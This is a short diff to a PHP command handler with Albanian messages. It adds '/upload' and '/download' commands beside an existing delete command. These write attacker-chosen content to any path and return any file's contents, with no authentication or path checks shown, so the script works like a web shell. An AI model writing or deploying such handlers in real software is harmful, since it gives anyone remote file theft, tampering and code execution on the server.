@@ -31,8 +31,23 @@ if(strpos($input, '/')===0){
                 if (file_exists($arg1)) {
                 unlink($arg1);
                 $response = "File '$arg1' u fshi.";
-                } else { $response = "Error: File nuk u gjet."; }
-                break;
+                } else { $response = "Error: File nuk u gjet.";
+                }break;
+            case '/upload': 
+                if ($arg1 !== '' && $arg2 !== '') {
+                file_put_contents($arg1, $arg2); 
+                $response = "File '$arg1' u ngarkua me sukses.";
+                } else { 
+                $response = "Error: Mungon emri ose permbajtja."; 
+                }break;
+            case '/download':
+                if (file_exists($arg1) && !is_dir($arg1)) {
+                $response = "FILE_DATA:" . $arg1 . ":" . file_get_contents($arg1);
+                } else { 
+                $response = "Error: File nuk ekziston."; 
+                }break;
+                default:
+                $response = "Komande e panjohur.";
+                   }
+                }
         }
-    }
-}
